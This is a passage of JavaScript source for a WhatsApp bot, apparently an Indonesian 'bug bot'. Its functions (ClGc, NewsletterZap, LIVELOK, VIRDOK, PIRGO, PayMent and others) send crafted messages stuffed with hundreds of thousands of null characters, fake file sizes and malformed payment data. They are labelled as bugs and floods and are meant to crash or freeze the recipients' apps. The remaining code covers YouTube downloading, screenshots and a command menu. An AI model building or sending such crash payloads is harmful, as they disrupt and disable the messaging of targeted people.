							conversionDelaySeconds: 10,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " X ",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								caption: " X "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽",
								body: "𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " x ",
								sourceId: " x ",
								sourceUrl: "https://www.instagram.com/raditx7",
								mediaUrl: "https://www.instagram.com/raditx7",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "https://www.instagram.com/raditx7"
							},
							groupSubject: " X ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " X ",
							trustBannerAction: 1,
							isSampled: false,
							utm: {
								utmSource: " X ",
								utmCampaign: " X "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " X ",
								contentType: "UPDATE",
								accessibilityText: " X "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};
		//GROUP\\
		async function caltx(LockJids) {
			let etc = generateWAMessageFromContent(
				LockJids,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							scheduledCallCreationMessage: {
								scheduledTimestampMs: Date.now(),
								callType: 2,
								title: ""
							}
						}
					},
				}), {
					userJid: LockJids
				}
			);
			await VxoZap.relayMessage(LockJids, etc.message, {});
		}
		async function ClGc(LockJids) {
			await VxoZap.relayMessage(LockJids, {
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉" + "\u0000".repeat(900000)
							},
							nativeFlowMessage: {
								messageParamsJson: ""
							},
							carouselMessage: {}
						}
					}
				}
			}, {});
			let X = fs.readFileSync('./system/image/XY.webp')
			await VxoZap.sendMessage(LockJids, {
				sticker: X
			}, {
				quoted: GSZ
			})
		}

		//SPAMMING FLOODS\\
		async function LiveLok(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						"liveLocationMessage": {
							"degreesLatitude": "x",
							"degreesLongitude": "x",
							"caption": `🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉` + "\u0000",
							"sequenceNumber": "0",
							"jpegThumbnail": ""
						}
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await VxoZap.relayMessage(LockJids, etc.message, {
				messageId: etc.key.id
			});
		}

		//NEWSTELER X PAYMENT\\
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${VxO},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			VxoZap.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}
		const VxO = "🔥⃰͜͡⭑𝐕𝐱͢𝐎⭑͜͡🔥⃰" + "\u0000".repeat(50000)
		async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "🚫⃰͜͡⭑𝐓𝐝͢𝐗⭑͜͡🚫⃰" + "\u0000".repeat(920000),
							"jpegThumbnail": "",
							"caption": `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await VxoZap.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

		//REVISION\\
		async function LIVELOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						"liveLocationMessage": {
							"degreesLatitude": "p",
							"degreesLongitude": "p",
							"caption": `🍷꙰͜͡𝐏𝐚𝐤𝐓𝐳𝐲💸` + "\u0000".repeat(900000),
							"sequenceNumber": "0",
							"jpegThumbnail": ""
						}
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			})
			await VxoZap.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			})
		}

		async function VIRDOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"documentMessage": {
					"url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
					"mimetype": "penis",
					"fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
					"fileLength": "999999999",
					"pageCount": 999999999,
					"mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
					"fileName": `🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟` + "\u0000".repeat(900000),
					"fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
					"directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
					"mediaKeyTimestamp": "1715880173"
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await VxoZap.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		async function BLEKING(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"stickerMessage": {
					"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
					"fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
					"fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
					"mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
					"mimetype": "image/webp",
					"directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
					"fileLength": "10116",
					"mediaKeyTimestamp": "1715876003",
					"isAnimated": false,
					"stickerSentTs": "1715881084144",
					"isAvatar": false,
					"isAiSticker": false,
					"isLottie": false
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await VxoZap.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		async function PIRGO(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				interactiveMessage: {
					header: {
						title: "🩸⃟༑⌁⃰𝐙͈𝐲𝐫͢𝐞𝐧 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
						hasMediaAttachment: true,
						...(await prepareWAMessageMedia({
							image: {
								url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg"
							}
						}, {
							upload: ryozingod.waUploadToServer
						}))
					},
					body: {
						text: ""
					},
					footer: {
						text: "› ©MargaTzy!!"
					},
					nativeFlowMessage: {
						messageParamsJson: " ".repeat(1000000)
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await ryozingod.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		const PORKE = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./system/image/VR.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐫͢𝐞𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const PORKE2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./system/image/VR.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐫͢𝐞𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}
		//QUOTED ZAP\\
		const dottm = {
			key: {
				fromMe: false,
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				orderMessage: {
					orderId: '999999999999',
					thumbnail: null,
					itemCount: 999999999999,
					status: 'INQUIRY',
					surface: 'CATALOG',
					message: '▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐂𝐋͢𝐈𝚵𝐍͢𝐓 ▾',
					token: 'AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=='
				}
			},
			contextInfo: {
				mentionedJid: ['27746135260@s.whatsapp.net'],
				forwardingScore: 999,
				isForwarded: true
			}
		}
		const GSZ = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			message: {
				listResponseMessage: {
					title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`
				}
			}
		}
		async function prM(params) {
			return await prepareWAMessageMedia(params, {
				upload: VxoZap.waUploadToServer
			})
		}
		//END FNC BUG\\
		//=================================================//

		//=================================================//
		//RANDOM IMAGE\\
		const X1 = [I1, I2, I3, I4]
		const randomIndex = Math.floor(Math.random() * X1.length)
		const V1 = X1[randomIndex]
		//=================================================//
		// REPLY \\
		//=================================================//
		const zreply = async (teks) => {
			let X1 = [TheZhiro, gsz, nulll, nulll2]
			let randomIndex = Math.floor(Math.random() * X1.length)
			let V1 = X1[randomIndex]
			return VxoZap.sendMessage(m.chat, {
				contextInfo: {
					mentionedJid: [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map((x) => x[1]).filter((x) => !isNaN(parseInt(x))).map((x) => x + "@s.whatsapp.net"),
					externalAdReply: {
						showAdAttribution: true,
						renderLargerThumbnail: false,
						title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
						body: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
						previewType: "VIDEO",
						thumbnail: V1,
						sourceUrl: ``,
						mediaUrl: `https://youtube.com/@PakTzy`
					}
				},
				text: teks
			}, {
				quoted: zets
			})
		}
		const zets = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: V1,
					itemCount: `777`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}
		const Zets = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: V1,
					itemCount: `777`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉️`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}
		const trol = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": fs.readFileSync("./system/image/TheZhiro.jpg"),
					"itemCount": 100000000000,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘",
					"orderTitle": "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ",
					"sellerJid": "6281991410940@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "500000000000000",
					"totalCurrencyCode": "IDR"
				}
			}
		}
		const doc = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"documentMessage": {
					"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
					"mimetype": "application/octet-stream",
					"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
					"fileLength": "64455",
					"pageCount": 1,
					"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
					"fileName": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
					"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
				}
			}
		}
		// END REPLY \\
		//=================================================//

		//REACTION\\
		const reaction = async (jidss, emoji) => {
			VxoZap.sendMessage(jidss, {
				react: {
					text: emoji,
					key: m.key
				}
			})
		}

		//DOWNLOAD YOUTUBE\\
		//=================================================//
		const downloadMp3 = async (url) => {
			try {
				// Panggil API untuk mendapatkan data MP3
				let response = await fetch(`https://api.betabotz.eu.org/api/download/ytmp3?url=${url}&apikey=GetsuZo`);
				let data = await response.json();

				if (!data.status) throw new Error('Failed to fetch data from API');

				// Ambil informasi dari hasil API
				let result = data.result;
				let title = result.title;
				let mp3Url = result.mp3;
				let thumbnailUrl = result.thumb;

				// Kirim pesan audio ke WhatsApp
				await VxoZap.sendMessage(m.chat, {
					audio: {
						url: mp3Url
					},
					fileName: `${title}.mp3`,
					mimetype: 'audio/mpeg',
					contextInfo: {
						externalAdReply: {
							title: title,
							body: packname, // packname bisa disesuaikan
							thumbnailUrl: thumbnailUrl,
							sourceUrl: mp3Url,
							mediaType: 1,
							mediaUrl: result.source,
						}
					},
				}, {
					quoted: Zets
				});

				console.log(`Success: MP3 sent for video ${title}`);
			} catch (error) {
				console.error('Error downloading MP3:', error);
				zreply(`Error: Could not download MP3 for the provided URL.`);
			}
		}
		async function ytdlnew(videoUrl) {
			return new Promise(async (resolve, reject) => {
				try {
					const searchParams = new URLSearchParams();
					searchParams.append('query', videoUrl);
					searchParams.append('vt', 'mp3');
					const searchResponse = await axios.post(
						'https://tomp3.cc/api/ajax/search',
						searchParams.toString(), {
							headers: {
								'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
								'Accept': '*/*',
								'X-Requested-With': 'XMLHttpRequest'
							}
						}
					);
					if (searchResponse.data.status !== 'ok') {
						throw new Error('Failed to search for the video.');
					}
					const videoId = searchResponse.data.vid;
					const videoTitle = searchResponse.data.title;
					const mp4Options = searchResponse.data.links.mp4;
					const mp3Options = searchResponse.data.links.mp3;
					const mediumQualityMp4Option = mp4Options[136];
					const mp3Option = mp3Options['mp3128'];
					const mp4ConvertParams = new URLSearchParams();
					mp4ConvertParams.append('vid', videoId);
					mp4ConvertParams.append('k', mediumQualityMp4Option.k);
					const mp4ConvertResponse = await axios.post(
						'https://tomp3.cc/api/ajax/convert',
						mp4ConvertParams.toString(), {
							headers: {
								'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
								'Accept': '*/*',
								'X-Requested-With': 'XMLHttpRequest'
							}
						}
					);
					if (mp4ConvertResponse.data.status !== 'ok') {
						throw new Error('Failed to convert the video to MP4.');
					}
					const mp4DownloadLink = mp4ConvertResponse.data.dlink;
					const mp3ConvertParams = new URLSearchParams();
					mp3ConvertParams.append('vid', videoId);
					mp3ConvertParams.append('k', mp3Option.k);
					const mp3ConvertResponse = await axios.post(
						'https://tomp3.cc/api/ajax/convert',
						mp3ConvertParams.toString(), {
							headers: {
								'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
								'Accept': '*/*',
								'X-Requested-With': 'XMLHttpRequest'
							}
						}
					);
					if (mp3ConvertResponse.data.status !== 'ok') {
						throw new Error('Failed to convert the video to MP3.');
					}
					const mp3DownloadLink = mp3ConvertResponse.data.dlink;
					resolve({
						title: videoTitle,
						mp4DownloadLink,
						mp3DownloadLink
					});
				} catch (error) {
					reject('Error: ' + error.message);
				}
			});
		}
		//=================================================//


		//SS WEB\\
		//=================================================//
		async function ssweb(url, device = "desktop") {
			return new Promise((resolve, reject) => {
				const base = "https://www.screenshotmachine.com"
				const param = {
					url: url,
					device: device,
					cacheLimit: 0
				}
				axios({
					url: base + "/capture.php",
					method: "POST",
					data: new URLSearchParams(Object.entries(param)),
					headers: {
						"content-type": "application/x-www-form-urlencoded; charset=UTF-8"
					}
				}).then((data) => {
					const cookies = data.headers["set-cookie"]
					if (data.data.status == "success") {
						axios.get(base + "/" + data.data.link, {
							headers: {
								"cookie": cookies.join("")
							},
							responseType: "arraybuffer"
						}).then(({
							data
						}) => {
							result = {
								status: 200,
								result: data
							}
							resolve(result)
						})
					} else {
						reject({
							status: 404,
							statuses: `Link Error`,
							message: data.data
						})
					}
				}).catch(reject)
			})
		}
		//=================================================//

		//=================================================//
		// CONSOLE \\
		//=================================================//
		const command_log = [chalk.whiteBright("├"), chalk.keyword("aqua")(`[ ${m.isGroup? "GROUP" : "PRIVATE"} ]`), chalk.whiteBright(body == "" && isImage ? "image" : body == "" && isVideo ? "video" : body == "" && isViewOnce ? "view once" : body == "" && isDocument ? "document" : isSticker ? "sticker" : isAudio ? "audio" : isVoice ? "voice" : isContact ? "contact" : isLocation ? "location" : isProtocol ? "delete message" : isPollUpdate ? "update poll" : isPollCreation ? "creation poll" : body), chalk.greenBright("from"), chalk.yellow(m.pushName)]
		if (isGroup) {
			command_log.push(chalk.greenBright("in"))
			command_log.push(chalk.yellow(groupName))
		}
		if (isImage || isVideo || isViewOnce || isDocument || isSticker || isAudio || isVoice || isContact || isLocation || isProtocol || isPollUpdate || isPollCreation || isText || isButtonList || isButtonReply) console.log(...command_log)
		//=================================================//


		// Status \\
		//=================================================//
		switch (command) {
			case "public": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (db.data.settings[botNumber].public == true) return zreply("Sudah Di Mode Public")
				db.data.settings[botNumber].public = true
				zreply(`${mess.success}`)
			}
			break
			case "self": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (db.data.settings[botNumber].public == false) return zreply("Sudah Di Mode Self")
				db.data.settings[botNumber].public = false
				zreply(`${mess.success}`)
			}
			break
			//=================================================//
			case "speed":
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				zreply(`*${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()} Seconds*`)
				break
				//=================================================//
			case "runtime":
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				zreply(`${runtime(process.uptime())}`)
				break
				//=================================================//
			case "restart":
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				zreply("Restarting Bot.....")
				setTimeout(() => {
					process.send("reset")
				}, 3000)
				break
			case "shutdown": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				zreply(`Shutdown Bot...`)
				await sleep(5000)
				process.eXit()
			}
			break
			//=================================================//
			//END STATUS\\


			//MENU\\
			//=================================================//
			case "menu": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				let X1 = [TheZhiro, nulll, nulll2]
				let randomIndex = Math.floor(Math.random() * X1.length)
				let V1 = X1[randomIndex]
				let BUTTON = `
╭──(         𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙋𝙖𝙠 𝙏𝙯𝙮 𝘿𝙚𝙫\`\𐁘
│🎭 𝐎𝐰𝐧 𝐍𝐨 : 081991410940
║🎭 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
║› 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣`
				let MSG = `
╭──(         𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙋𝙖𝙠 𝙏𝙯𝙮 𝘿𝙚𝙫\`\𐁘
│🎭 𝐎𝐰𝐧 𝐍𝐨 : 081991410940
║🎭 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
║
│›› Setmenu
║›› Allmenu
